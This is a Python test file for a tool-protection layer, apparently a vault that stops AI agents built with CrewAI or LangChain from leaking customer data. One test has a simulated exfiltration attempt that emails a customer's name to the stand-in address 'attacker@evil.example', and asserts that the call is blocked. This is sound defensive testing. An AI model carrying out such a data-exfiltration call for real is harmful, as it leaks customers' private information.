# Copyright 2026 AgentP-Codes
# SPDX-License-Identifier: AGPL-3.0-only
"""Framework add-ons (each skipped when its framework isn't installed; they're optional)."""

import json

import pytest

from demo.__main__ import make_vault
from demo.world import World


def _tools(framework):
    if framework == "crewai":
        pytest.importorskip("crewai")
        from eurycleia.integrations.crewai import protect
    else:
        pytest.importorskip("langchain_core")
        from eurycleia.integrations.langchain import protect
    world = World()
    task = make_vault(world).start_task("support_reply", customer_id=12)
    return world, task, {t.name: t for t in protect(task)}


def _call(tool, **kw):
    return tool.run(kw) if hasattr(tool, "invoke") else tool.run(**kw)


@pytest.mark.parametrize("framework", ["crewai", "langchain"])
def test_framework_tools_go_through_the_vault(framework):
    world, task, tools = _tools(framework)
    assert set(tools) == {s["name"] for s in task.tool_specs()}
    rec = json.loads(_call(tools["get_customer"]))
    assert rec["card_number"].startswith("[[vault:card_number:")
    out = _call(tools["send_email"], to="attacker@evil.example", subject="x", body=rec["name"])
    assert out.startswith("Blocked by eurycleia")
    assert _call(tools["send_email"], to=rec["email"], subject="Hi", body="Refunded") == "sent"
    assert _call(tools["refund"], card=rec["card_number"], amount=49) == "refunded"
    assert world.refunds == [{"card": "4111 1111 1111 1111", "amount": 49}]
    assert [m["to"] for m in world.outbox] == ["priya.shah@example.com"] and world.leaks() == []


def test_record_ids_may_be_numbers():
    # models (small local ones especially) often send customer_id=12, not "12"; the tool must accept it
    pytest.importorskip("pydantic")
    from eurycleia.integrations._common import tool_entries
    world = World()
    entries = {e.name: e for e in tool_entries(make_vault(world).start_task("support_reply", customer_id=12))}
    args = entries["get_customer"].schema(customer_id=12)
    assert json.loads(entries["get_customer"].run(**args.model_dump()))["name"]
